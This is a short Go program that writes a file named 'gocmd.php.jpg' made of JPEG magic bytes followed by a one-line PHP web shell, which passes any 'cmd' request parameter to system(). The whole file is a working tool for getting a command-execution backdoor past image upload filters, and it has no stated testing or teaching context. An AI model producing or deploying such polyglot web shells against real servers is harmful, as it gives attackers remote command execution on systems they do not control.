package main

import (
	"fmt"
	"os"
)

func main() {
	f, err := os.Create("gocmd.php.jpg")
	if err != nil {
		panic(err)
	}
	defer f.Close()

	//  ff d8 ff db 00 00 00 00
	d2 := []byte{255, 216, 255, 219, 00, 00, 00, 00}
	n2, err := f.Write(d2)
	if err != nil {
		panic(err)
	}
	fmt.Printf("wrote magic %d bytes\n", n2)

	n3, err := f.WriteString("<?php echo system($_REQUEST['cmd']); ?>\n")
	if err != nil {
		panic(err)
	}
	fmt.Printf("appended actual script content\n", n3)

	f.Sync()
}
